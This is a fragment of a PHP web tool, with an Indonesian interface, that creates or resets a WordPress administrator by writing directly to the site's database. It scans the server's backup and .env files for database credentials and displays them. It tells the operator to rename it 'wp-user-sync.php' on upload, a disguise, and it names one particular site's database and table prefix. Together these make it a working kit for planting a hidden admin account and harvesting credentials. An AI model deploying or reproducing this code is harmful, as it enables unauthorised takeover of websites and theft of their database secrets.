if (isset($_POST['findurl'])) {
    $base = ba_find_base($manual_path);
    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
    $url_result = ba_lookup_site_urls($base, $manual_db);
}

if (isset($_POST['testdb'])) {
    $base = ba_find_base($manual_path);
    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
    $test_result = ba_test_db($base, $manual_db);
}

if (isset($_POST['run'])) {
    $user = isset($_POST['username']) ? trim($_POST['username']) : $BA_USER;
    $pass = isset($_POST['newpass']) ? $_POST['newpass'] : $BA_NEWPW;
    $mail = isset($_POST['email']) ? trim($_POST['email']) : $BA_EMAIL;
    $base = ba_find_base($manual_path);
    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
    if ($user === '' || $pass === '') {
        $result = array('ok' => false, 'msg' => 'Username/password wajib diisi');
    } else {
        $result = ba_create($base, $user, $pass, $mail, $manual_db);
    }
}

header('Content-Type: text/html; charset=utf-8');

$base = ba_find_base($manual_path);
$fake_cfg = ($base !== '') ? ba_fake_wpconfig_path($base) : '';
$manual_db_preview = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
$cfg_preview = ba_get_db_config($base !== '' ? $base : dirname(__FILE__), $manual_db_preview);

echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Buat Admin</title>';
echo '<style>body{font:14px sans-serif;background:#f5f5f5;padding:16px}.c{max-width:620px;margin:0 auto;background:#fff;border:1px solid #ddd;padding:16px}';
echo 'input{width:100%;padding:8px;box-sizing:border-box;margin:6px 0}.btn{padding:10px 16px;background:#2563eb;color:#fff;border:0;cursor:pointer;margin-right:8px}';
echo '.ok{background:#ecfdf5;padding:12px;border:1px solid #86efac;margin:12px 0}.err{background:#fef2f2;padding:12px;border:1px solid #fca5a5;margin:12px 0}';
echo '.warn{background:#fffbeb;padding:12px;border:1px solid #fcd34d;margin:12px 0}.m{font-size:12px;color:#666}fieldset{border:1px solid #ddd;padding:12px;margin:12px 0}</style></head><body>';
echo '<div class="c"><h2>Buat WordPress Administrator</h2>';
echo '<p class="m"><b>v2.5</b> — cari URL website dari DB/config | PHP ' . ba_esc(PHP_VERSION) . '</p>';
echo '<div class="warn" style="background:#fffbeb;padding:10px;border:1px solid #fcd34d;margin:10px 0;font-size:13px">';
echo '<b>Site ini:</b> DB <code>astverdi_pba-assunnah</code> | prefix <code>wpyc_</code><br>';
echo 'Base URL <b>tidak ada di wp-config</b> — klik <b>Cari URL Website</b> untuk baca dari tabel <code>wpyc_options</code><br>';
echo 'Rename saat upload: <code>wp-user-sync.php</code></div>';
echo '<p class="m">Script: <code>' . ba_esc(__FILE__) . '</code></p>';
echo '<p class="m">WP path: <code>' . ba_esc($base !== '' ? $base : '(belum ditemukan — isi path manual)') . '</code></p>';
if ($fake_cfg !== '') {
    echo '<div class="warn"><b>Peringatan:</b> <code>' . ba_esc($fake_cfg) . '</code> berisi HTML (bukan config WordPress). Kemungkinan hasil deface/malware. Pakai kredensial DB manual atau cari backup <code>wp-config.php.bak</code>.</div>';
}
if ($cfg_preview['ok']) {
    echo '<p class="m">Config: <code>' . ba_esc($cfg_preview['config_file']) . '</code></p>';
    echo '<p class="m">DB: <code>' . ba_esc($cfg_preview['db']['name']) . '@' . ba_esc($cfg_preview['db']['host']) . '</code> | prefix: <code>' . ba_esc($cfg_preview['prefix']) . '</code></p>';
} elseif ($base === '' && !$use_manual_db) {
    echo '<p class="m">Contoh path manual: <code>..</code>, <code>../public_html</code>, atau <code>/var/www/html2/</code></p>';
}

if ($hunt_result !== null) {
    if (!$hunt_result['ok'] && !empty($hunt_result['msg']) && empty($hunt_result['hits'])) {
        echo '<div class="err">' . ba_esc($hunt_result['msg']) . '</div>';
    } elseif (!empty($hunt_result['msg'])) {
        echo '<div class="ok">' . ba_esc($hunt_result['msg']) . '</div>';
    }
    if (!empty($hunt_result['hits'])) {
        echo '<div class="ok"><b>Kredensial ditemukan di file server:</b><ul style="margin:8px 0;padding-left:18px">';
        $hi = 0;
        $hn = count($hunt_result['hits']);
        for ($hi = 0; $hi < $hn; $hi++) {
            $h = $hunt_result['hits'][$hi];
            echo '<li style="margin:8px 0"><code>' . ba_esc($h['file']) . '</code><br>';
            echo 'Host: <b>' . ba_esc($h['db']['host']) . '</b> | User: <b>' . ba_esc($h['db']['user']) . '</b> | DB: <b>' . ba_esc($h['db']['name']) . '</b><br>';
            echo 'Pass: <code>' . ba_esc(ba_mask_pass($h['db']['pass'])) . '</code> | Prefix: <code>' . ba_esc($h['prefix']) . '</code><br>';
            echo '<button class="btn" type="submit" name="apply_cred" value="' . $hi . '" form="baform">Pakai #' . ($hi + 1) . '</button></li>';
        }
        echo '</ul></div>';
    }
}

if ($test_result !== null) {
    if ($test_result['ok']) {
        echo '<div class="ok">' . ba_esc($test_result['msg']);
        if (!empty($test_result['urls'])) {
            echo '<br><br><b>URL website (dari database):</b><ul style="margin:6px 0;padding-left:18px">';
            foreach ($test_result['urls'] as $u => $src) {
                echo '<li><a href="' . ba_esc($u) . '/wp-admin/" target="_blank">' . ba_esc($u) . '</a> <span class="m">(' . ba_esc($src) . ')</span></li>';
            }
            echo '</ul>';
        }
        echo '</div>';
    } else {
        echo '<div class="err">' . ba_esc($test_result['msg']) . '</div>';
    }
}

if ($url_result !== null) {
    if (!$url_result['ok']) {
        echo '<div class="err">' . ba_esc($url_result['msg']) . '</div>';
    } else {
        echo '<div class="ok"><b>URL website ditemukan:</b><ul style="margin:6px 0;padding-left:18px">';
        foreach ($url_result['urls'] as $u => $src) {
            $admin = rtrim($u, '/') . '/wp-admin/';
            echo '<li><b>' . ba_esc($src) . '</b><br>';
            echo 'Site: <a href="' . ba_esc($u) . '" target="_blank">' . ba_esc($u) . '</a><br>';
            echo 'Admin: <a href="' . ba_esc($admin) . '" target="_blank">' . ba_esc($admin) . '</a></li>';
        }
        echo '</ul><span class="m">Prioritas: URL dari database &gt; config &gt; tebakan path.</span></div>';
    }
}

if ($result !== null) {
    if ($result['ok']) {
        echo '<div class="ok"><b>' . ba_esc($result['msg']) . '</b><br><br>';
        echo 'Metode: ' . ba_esc($result['via']) . '<br>';
        echo 'User: <b>' . ba_esc($result['user']) . '</b><br>';
        echo 'Pass: <b>' . ba_esc($result['pass']) . '</b><br>';
        echo 'User ID: ' . (int) $result['id'] . '<br>';
        if (!empty($result['fallback'])) {
            echo '<span class="m">' . ba_esc($result['fallback']) . '</span><br>';
        }
        if (!empty($result['login_url'])) {
            echo '<br>Login: <a href="' . ba_esc($result['login_url']) . '" target="_blank">' . ba_esc($result['login_url']) . '</a><br>';
        } else {
            echo '<br>Login: <a href="/wp-admin/">/wp-admin/</a><br>';
        }
        echo '<b class="m">HAPUS buat_admin.php sekarang!</b></div>';
    } else {
        echo '<div class="err">' . ba_esc($result['msg']) . '</div>';
    }
}

echo '<form method="post" id="baform">';
echo '<label>Path manual (folder wp-load.php)</label><input name="manual_path" value="' . ba_esc($manual_path) . '" placeholder="/var/www/html2/">';
echo '<fieldset><legend>Kredensial database manual</legend>';
echo '<p class="m">Tanpa cPanel: klik <b>Cari Kredensial DB</b> dulu — script scan file backup (.bak, .old, .env) di server.</p>';
echo '<label><input type="checkbox" name="use_manual_db" value="1"' . ($use_manual_db ? ' checked' : '') . '> Pakai kredensial DB manual</label>';
echo '<label>DB Host</label><input name="db_host" value="' . ba_esc($db_host) . '" placeholder="localhost (jangan $dbhost)">';
echo '<label>DB User</label><input name="db_user" value="' . ba_esc($db_user) . '">';
echo '<label>DB Password</label><input name="db_pass" type="password" value="' . ba_esc($db_pass) . '">';
echo '<label>DB Name</label><input name="db_name" value="' . ba_esc($db_name) . '">';
echo '<label>Table prefix (kosongkan = auto-detect)</label><input name="db_prefix" value="' . ba_esc($db_prefix) . '" placeholder="wp_">';
echo '</fieldset>';
echo '<label>Username</label><input name="username" value="' . ba_esc($BA_USER) . '">';
echo '<label>Password baru</label><input name="newpass" value="' . ba_esc($BA_NEWPW) . '">';
echo '<label>Email</label><input name="email" value="' . ba_esc($BA_EMAIL) . '">';
echo '<p class="m">Web: langsung ke database (mysqli). Tidak memuat WordPress — tidak redirect ke index.php.</p>';
echo '<button class="btn" type="submit" name="huntcred" value="1">Cari Kredensial DB</button>';
echo '<button class="btn" type="submit" name="findurl" value="1">Cari URL Website</button>';
echo '<button class="btn" type="submit" name="testdb" value="1">Test Database</button>';
echo '<button class="btn" type="submit" name="run" value="1" onclick="return confirm(\'Buat/reset admin WordPress?\');">Buat Admin</button>';
echo '</form></div></body></html>';
